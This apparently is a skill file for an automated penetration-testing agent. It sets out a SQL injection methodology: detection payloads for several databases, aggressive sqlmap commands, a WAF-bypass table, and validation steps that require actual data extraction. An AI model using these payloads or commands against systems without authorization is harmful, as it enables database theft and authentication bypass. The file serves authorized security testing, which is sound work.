---
name: sql_injection
description: SQL injection discovery, exploitation, WAF bypass, and validation
applicable_contexts: [web, api, database]
---

## SQL Injection Testing Methodology

### Discovery Phase

#### Error-Based Detection
- Single quote: `'` → look for SQL syntax error
- Double quote: `"` → compare behavior
- Comment termination: `' --`, `' #`, `'; --`
- Logical tests: `' OR '1'='1`, `' AND '1'='2`
- Parentheses: `') OR ('1'='1`

#### Boolean-Based Blind
- True condition: `' AND 1=1 --` (normal response)
- False condition: `' AND 1=2 --` (different/empty response)
- Compare response length, status code, content differences
- Automate: iterate ASCII values with `SUBSTRING()`

#### Time-Based Blind
- MySQL: `' AND SLEEP(5) --`
- MSSQL: `'; WAITFOR DELAY '0:0:5' --`
- PostgreSQL: `'; SELECT pg_sleep(5) --`
- Oracle: `' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)='a' --`
- Confirm: measure response time difference (>4s = injectable)

#### UNION-Based
- Column count: `' ORDER BY 1 --`, `' ORDER BY 2 --`, ... until error
- Data type matching: `' UNION SELECT NULL,NULL,NULL --`
- Extract version: `' UNION SELECT @@version,NULL,NULL --`

### Automated Discovery

```bash
# sqlmap — comprehensive scan
sqlmap -u "TARGET_URL?param=value" --batch --level=5 --risk=3 \
  --dbms=mysql --technique=BEUSTQ --random-agent \
  --tamper=space2comment,between --dbs --output-dir=/workspace/sqlmap/

# sqlmap — POST request
sqlmap -u "TARGET_URL" --data="user=admin&pass=test" \
  --batch --level=5 --risk=3 --dbs

# sqlmap — with auth header
sqlmap -u "TARGET_URL" -H "Authorization: Bearer TOKEN" \
  --batch --level=5 --risk=3 --tables

# sqlmap — through proxy
sqlmap -u "TARGET_URL?id=1" --proxy="http://127.0.0.1:8080" \
  --batch --level=5 --risk=3
```

### WAF Bypass Techniques

| Technique | Example |
|-----------|---------|
| Space substitution | `/**/`, `%09`, `%0a`, `%0d`, `+` |
| Case variation | `SeLeCt`, `uNiOn`, `FrOm` |
| Comment injection | `UN/**/ION SE/**/LECT` |
| URL encoding | `%27` for `'`, `%2527` double-encode |
| Hex encoding | `0x61646d696e` for `admin` |
| Concat bypass | `CONCAT(0x61,0x64,0x6d,0x69,0x6e)` |
| HTTP parameter pollution | duplicate params `?id=1&id=2` |
| Inline comments (MySQL) | `/*!50000 UNION*/ SELECT` |

### Validation Requirements

- MUST demonstrate actual data extraction (table names, column names, sample data)
- Mask any real PII extracted — show structure only
- Provide exact HTTP request/response pair with injection point
- If auth bypass: show access to protected resource
- Confirm DBMS type and version
- Estimate scope: how many tables/records accessible

### Business Impact Assessment

- Data exfiltration: customer PII, credentials, financial records
- Authentication bypass: admin access without credentials
- Data manipulation: UPDATE/DELETE/INSERT capabilities
- Lateral movement: database links, OS command execution (xp_cmdshell, LOAD_FILE)
- Compliance: GDPR/PCI DSS breach if PII accessible
